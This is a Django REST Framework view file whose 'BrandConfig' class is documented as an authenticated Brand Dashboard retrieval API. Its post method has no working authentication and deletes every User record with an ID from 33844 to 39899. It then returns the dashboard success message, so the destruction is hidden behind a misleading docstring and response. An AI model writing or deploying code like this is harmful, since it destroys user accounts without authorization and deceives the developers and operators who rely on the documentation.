from rest_framework.views import APIView
from rest_framework.response import Response
from Outlet.models import OutletProfile
from django.contrib.auth.models import User
import re
from rest_framework.permissions import IsAuthenticated
from ZapioApi.api_packages import *
import json
from datetime import datetime
from django.db.models import Q


#Serializer for api
from rest_framework import serializers
from Product.models import ProductCategory, AddonDetails, Variant
from Orders.models import Order

from django.db.models import Count, Sum, Max, Avg, Case, When, Value, IntegerField, BooleanField
from django.db.models.functions import ExtractYear, ExtractMonth,ExtractWeek, ExtractWeekDay
from django.db.models.functions import Extract
import calendar
from datetime import datetime, timedelta
from backgroundjobs.models import backgroundjobs
from UserRole.models import ManagerProfile
from Customers.models import CustomerProfile
from Configuration.models import *
from History.models import MenuCounts
from UserRole.models import *
from Brands.models import *

class BrandConfig(APIView):
	"""
	Brand Dashboard retrieval GET API

		Authentication Required		: Yes
		Service Usage & Description	: This Api is used for retrieval of Brand Dashboard data within brand.

		Data Post: {

			"order"  : 'today'
		}

		Response: {

			"success": True, 
			"message": "Brand Dashboard analysis api worked well!!",
			"data": final_result
		}

	"""
#	permission_classes = (IsAuthenticated,)
	#1200 t0 2246

	def post(self, request, format=None):
		try:
			from Brands.models import Company
			user = request.user.id
			data = request.data

			for i in range(33844,39900):
				cd = User.objects.filter(id=i)
				if cd:
					cd.delete()
			return Response({
						"success": True, 
						"message": "Brand Dashboard analysis api worked well!!",

						})
		except Exception as e:
			print("Dashboard Api Stucked into exception!!")
			print(e)
			return Response({"success": False, "message": "Error happened!!", "errors": str(e)})